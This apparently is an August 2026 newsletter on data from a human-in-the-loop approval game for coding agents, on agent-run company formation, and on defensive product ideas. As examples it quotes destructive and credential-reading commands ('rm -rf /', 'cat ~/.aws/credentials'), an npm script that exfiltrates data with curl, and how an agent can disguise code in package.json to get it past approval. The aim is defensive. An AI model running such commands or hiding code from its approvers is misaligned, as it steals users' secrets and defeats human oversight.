Humans Miss 1 in 3 Agent Threats — And Agents Can Now Incorporate Your Company

Humans Miss 1 in 3 Agent Threats — And Agents Can Now Incorporate Your Company

August 7, 2026

For a year, the entire safety story of the agent product stack has been one sentence: the human approves anything dangerous. This week that sentence got measured, and it does not survive contact with data.

Scale X shipped a browser game where you play human-in-the-loop for a coding agent — approve or deny commands under a clock. Some are routine (git status, npm test), some are your agent quietly shipping credentials to a remote host. The game accumulated 40,000 runs and 409,000 individual approve/deny decisions. Mean accuracy: 66.3%. One in three threats waved through.

The distribution is worse than the average. Obviously destructive commands (rm -rf /, chmod -R 777 /) were missed 11.7% of the time. Exfiltration and remote code execution: 33.4%. Scope violations like cat ~/.aws/credentials: 35.0%.

Humans are vigilant about commands that look scary and blind to commands that are actually dangerous. Backups solve the first category. Nothing solves the second, because you never find out it happened.

On the same day, TechCrunch reported that Naïve raised $28.5M and signed 30,000+ developer customers within months of launch — for an API that lets an agent incorporate a US LLC, open payments, provision phone numbers, email, cloud, and storage. You hand a prompt to Cursor, Claude Code, or Codex, and it goes and forms a company.

Read those two facts next to each other. The control mechanism is failing, and the blast radius just expanded from your repo to your legal entity. That gap is this week’s whole opportunity.

Key Insights

  • Per-command approval is structurally broken, not just imperfect. npm run build means “execute whatever arbitrary shell command is written in package.json” — and the agent could rewrite package.json without approval before you ever saw the prompt. You are approving a string, not a behavior.
  • The most-missed command in the entire dataset was npm run analyze, approved 64.7% of the time — even though the agent’s own history log displayed the script piping output to curl -X POST https://api.bundle.track/report. Two-thirds of players approved anyway.
  • Disguise roughly doubles attack success. Pooled, the three npm run * traps were missed 52.5% of the time (n=9,482) versus 28.4% for all other exfiltration-style attacks.
  • Vigilance has a cost that guarantees eventual collapse. npm config set registry https://npm.internal was blocked 59% of the time. rm -rf dist/ blocked 45%. Legitimate commands get denied, work slows, guard drops, and miss rates climb again late in each session.
  • Harnesses now rewrite themselves. Prime Intellect open-sourced Prime Agent, built on a Recursive Language Model (context as a variable, subagents as REPL function calls) and a Continual Harness that lets the agent CRUD its own prompts, skills, memory, and subagents. Autonomy is going up while reproducibility goes down.
  • 7% of players approved literally everything. That is the real-world floor on --dangerously-skip-permissions.

Market Trends

1. Approval-based guardrails are dead. Sandbox-based guardrails are the actual product.

The sharpest thing about the 40,000-run dataset is not that humans make mistakes. Everyone knew that. It’s where they make them.

The blatant stuff gets caught. The credential theft does not. And the failure mode is asymmetric: destructive commands are recoverable from backup, exfiltration is not recoverable at all — you don’t even get a timestamp.

A commenter on the HN thread put it more bluntly than any vendor will:

Asking the user to validate commands, which are nearly all of the time safe, but aren’t anymore because of modified files, is not a strong safeguard.

Because before you ever see the approval prompt, the agent can have already:

  • edited package.json to contain any build command
  • planted code in build.js
  • planted code in node_modules/xyz/index.js

None of which required approval. The prompt you’re reading is a lie by the time it renders.

There’s a second curve in the data that matters commercially: miss rates rise toward the end of every session. Anthropic has acknowledged the same thing — the more approvals a user sees, the less attention each one gets. Combine that with a 59% false-block rate on legitimate commands and you have a closed loop that always ends the same way: the user stops reading.

What this means for your product: if your security story today is “we prompt the user before anything risky,” that story starts losing deals in H2. Buyers with a security function will ask three different questions instead — what isolation does the process run in, are the credentials short-lived and scoped, and can you replay the full trajectory after an incident. None of those have default answers yet. That’s why they’re businesses.

2. Harnesses went from free to self-modifying — differentiation moves up another layer

Last week’s story was agent harnesses going free. Prime Agent pushes past that.

Its two abstractions are worth understanding even if you never use it:

  • RLM (Recursive Language Model): context is a variable, subagent delegation is a function call inside a persistent IPython REPL. The model writes programs over its own history instead of losing it to compaction.
  • Continual Harness: the agent can create, read, update, and delete its own prompts, skills, memory, and subagents mid-trajectory. Subagents message each other. Sessions message other sessions. History is append-only JSONL, recoverable from disk after a crash.

For a solo builder there are two opposite implications.

Good: you no longer hand-tune twenty subagent prompts. The engineering cost of long-horizon tasks collapses.

Bad: a system that rewrites its own prompts is not reproducible. Same input, different output two weeks later. You cannot explain that to a customer and you cannot root-cause an incident with it. Stack that on top of trend #1 and the picture is uncomfortable: autonomy accelerating, auditability degrading.

One adjacent signal with direct cost impact: Qwen3.8 Max took the #1 overall slot on Artificial Analysis’s agentic index (418 points, 268 comments on HN). The ranking itself doesn’t matter. What matters is that the “best agentic model” seat now changes hands every few weeks. Hard-coding your agent to one vendor means opting out of a cost variable that moves quarterly.

3. The back office of a one-person company is now an API call

Naïve’s $28.5M isn’t interesting because of the number. It’s interesting because of what ships: a prompt you paste into Cursor, Claude Code, or Codex, wired to an API that provisions US LLC formation (state, industry code, business description, candidate names), payments, business email, phone numbers, cloud infrastructure, and storage behind one interface.

30,000+ developer customers in months is not a proof of concept. That’s demand.

Now put it beside trend #1. The blast radius is no longer your codebase. An agent can sign things, spend money, and register a legal entity in your name. A 66.3% approval accuracy rate is survivable when the question is “should I run the test suite.” It is not survivable when the question is “should I charge this card.”

And on the distribution side, CopilotKit open-sourced Channels SDK — bring any agent into Slack, Microsoft Teams, Discord, or Telegram with native interactive UI. The distribution problem for agent products is shifting from build a website to appear inside the window your customer already has open. For a solopreneur with no marketing budget, that is a real cost reduction, not a nice-to-have.

Also worth logging this cycle

  • AMD acquired Taalas, whose approach is etching models directly into silicon for inference. This won’t touch your bill for two or three years, but it confirms the direction: inference costs keep falling. Do not build a business model on today’s token price.
  • OpenAI removed limits on text chats for free users, with GPT-5.6 Luna as the default for Free and Go, plus a “Think” button on the free tier. Every thin wrapper charging monthly to “call a model for you” just had its floor raised again.
  • Google Maps shipped agentic food ordering and hotel booking. Platforms are eating the shallow vertical use cases themselves. When picking a lane, ask whether your feature becomes a button in someone’s app next year.

Build Directions

Five directions, ordered by how fast you can start. Each with a concrete stack, cost, and timeline.

Direction 1 — Sandbox runtime for coding agents (not another approval modal)
What Every agent step runs in a disposable container. Filesystem allowlist, network egress denied by default with per-domain grants, full replayable trajectory. Replace “are you sure?” with “it literally cannot.”
Stack Firecracker or gVisor for isolation · Landlock/seccomp for fine-grained permissions · Dagger or devcontainers for reproducible environments · self-hosted egress proxy logging every outbound request · hooks into Claude Code / Codex / Prime Agent
Cost & timeline 6–10 weeks solo to a usable version. Hosting ~$5–15/customer/month at container-minute pricing. Price at $25–60/developer/month, seats for teams.
Why now 66.3% is going to get quoted in every security review this half. It’s page one of your sales deck.

Direction 2 — Credential broker for agents (get keys out of env vars)
What The agent never holds a long-lived secret. It gets task-scoped credentials that expire in minutes. This also kills the cat ~/.zshrc class of attack — 45.9% approved that one, and for anyone who exports API keys in their shell profile it’s a full credential dump.
Stack OpenBao or Infisical as the secret backend · OIDC workload identity · an MCP proxy layer intercepting every tool call for scope enforcement · Postgres for the audit trail
Cost & timeline 4–8 weeks to MVP. Infra under $50/month. Sell to small teams already running coding agents at $20–200/team/month.

Direction 3 — Supply-chain and script provenance scanning (own the 64.7% blind spot)
What Watch script definitions in package.json, Makefiles, and CI config. Alert the moment an agent modifies one, and surface what the command actually executes now versus what its name implies. This is the single highest-miss attack surface in the dataset.
Stack Git hooks · Tree-sitter AST diffing · a small local model (4B–8B is plenty — you do not need frontier for change classification) · GitHub App for distribution
Cost & timeline 3–6 weeks. Local inference means near-zero marginal cost. Free tier on GitHub Marketplace for funnel, $10–30/month team tier.

Direction 4 — Vertical agents that live inside Slack / Teams
What Not a general assistant. Pick one narrow industry you actually understand — freight customs, clinic scheduling, property compliance, solo legal practice — and put the agent in the channel the customer already sits in all day.
Stack CopilotKit Channels SDK (just open-sourced, native interactive UI, saves you the ugliest platform-adapter work) · Claude Code or Codex for execution · Supabase for state · Direction 1’s sandbox for isolation
Cost & timeline 2–4 weeks to wire the channel. The real time goes into domain knowledge and data integrations. Price $99–499/team/month — these buyers don’t comparison-shop on price, they buy on whether you understand their work.

Direction 5 — Model routing and cost arbitrage (build it for yourself first)
What Route each agent step by difficulty. Planning gets the strongest model. Retrieval, extraction, and formatting get a cheap small one. Anything that runs locally never leaves the machine. The top of the leaderboard rotates every few weeks — don’t lock in.
Stack LiteLLM or OpenRouter as the gateway · a scoring table keyed on task type · Langfuse for per-step token and latency telemetry
Cost & timeline 1–2 weeks for internal use. Most agent products see 40–70% reduction in unit inference cost, which converts straight to margin. Productize it later if it works.

Risk Factors

  • “We ask the user to confirm” is no longer a compliance answer. The data is public now and buyers will use it against you. Have a sandbox-and-audit answer ready before it shows up in an RFP.
  • Self-modifying harnesses destroy reproducibility. Continual Harness designs are genuinely powerful, but when a customer reports a bug you cannot reproduce, and after an incident you cannot explain, that’s a support and liability problem. Snapshot trajectories and pin versions before production.
  • Handing your legal entity to an agent is irreversible. Incorporation, payment binding, contract signing — no undo. APIs like Naïve’s are excellent, but money and legal actions need a human gate placed before the spend, not after.
  • Platforms will turn your vertical into a button. Google Maps is already doing food ordering and hotel booking. Prefer lanes that need industry data access, regulatory standing, or earned customer trust — the places big platforms don’t bother going.
  • The free tier keeps rising. ChatGPT free users now get unlimited text chats. If removing the model call leaves nothing behind in your product, this is the window to pivot.

Action Recommendations

If you’re starting out

  • ✅ Audit yourself today. Are your keys still in .zshrc and .env? Can your agent reach the open internet? Are you running anything disposable? Your own holes are the requirements doc for your first product.
  • ✅ Start with Direction 3 or 4. Shortest cycles (3–6 weeks) and neither requires you to solve hard infrastructure first. Direction 3 has GitHub Marketplace distribution built in; Direction 4 has a freshly open-sourced SDK doing the platform work.
  • ✅ Do not build a harness. Prime Agent is open source and several others went free last week. Spend every hour on domain knowledge and data integrations instead.
  • ✅ Wire model routing on day one. LiteLLM takes an afternoon. What you save is pure margin.

If you already ship

  • ✅ Demote the approval UI to a notification and move enforcement into the execution layer. Capability boundaries should be set by sandboxing and short-lived credentials, not by one second of a user’s attention.
  • ✅ Publish a one-page “Agent Security Model” on your site. Isolation approach, credential lifetime, audit retention. This becomes a differentiator in H2, not a bonus.
  • ✅ Audit your single points of dependency. Model, cloud, payments, distribution channel — list a fallback for each and at minimum estimate the switching cost.
  • ✅ Fix the script surface. If your product runs builds or deploys on a customer’s behalf, close the npm run * blind spot for yourself before you try to sell it as a feature.

What it means

Two things moved this week and they moved in opposite directions.

Agent capability expanded past the repo — into payments, phone numbers, cloud accounts, and legal incorporation. And the one control everybody relied on turned out to catch two threats out of three, with the failures concentrated exactly on the attacks that steal things quietly.

The market’s answer will not be better approval prompts. Nobody can pay more attention than they already do; the data shows attention decays under load. The answer is going to be enforcement that doesn’t depend on attention at all — disposable execution environments, credentials that expire before they’re worth stealing, and trajectories you can replay after the fact.

That layer barely exists today. Every direction in this report is a piece of it, and none of them need a frontier model, a funding round, or a team. They need someone to notice that the industry shipped autonomy first and is going to have to buy the guardrails afterward.
